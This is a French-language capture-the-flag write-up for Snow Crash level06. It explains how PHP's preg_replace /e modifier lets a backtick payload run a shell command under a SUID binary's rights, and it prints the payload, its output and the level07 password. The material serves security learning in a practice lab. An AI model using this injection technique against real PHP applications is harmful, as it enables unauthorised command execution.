# Snow Crash – Level06

## 🎯 Objectif
Exploiter une injection de code PHP via une faille dans `preg_replace` pour exécuter `getflag` avec les droits de `flag06`.

---

## 📂 Fichiers présents

```bash
level06
level06.php
```

- `level06` : binaire SUID appartenant à `flag06`.
- `level06.php` : script PHP exécuté par le binaire.

---

## 🧠 Fonctionnement

### Exécution classique :
```bash
./level06 /tmp/fichier
```

Le fichier est lu par `level06.php` et interprété.

### Contenu de `level06.php` (extrait clé) :
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

🛑 Le modificateur `/e` est une **faille** : il évalue dynamiquement du code PHP.

---

## 💥 Faille et contournement

La fonction `y()` modifie certains caractères :
- `.` devient ` x `
- `@` devient ` y`

Mais les **backticks** (`` ` ``) ne sont pas modifiés → **exécution de commandes shell possible**.

---

## 🛠️ Exploitation

### 1. Créer un fichier contenant une commande `getflag`
```bash
echo '[x ${`getflag`} ]' > /tmp/getflag06
```

### 2. Exécuter le binaire :
```bash
./level06 /tmp/getflag06
```

### ✅ Résultat :
```txt
Check flag. Here is your token : wiok45aaoguiboiki2tuin6ub
```

---

## ✅ Résumé

- 🧠 Faille : `preg_replace(.../e)` → exécution dynamique PHP
- 🛠️ Payload : `[x ${\`getflag\`} ]`
- 🏆 Token : `wiok45aaoguiboiki2tuin6ub`
- 🔑 Mot de passe `level07` : `wiok45aaoguiboiki2tuin6ub`
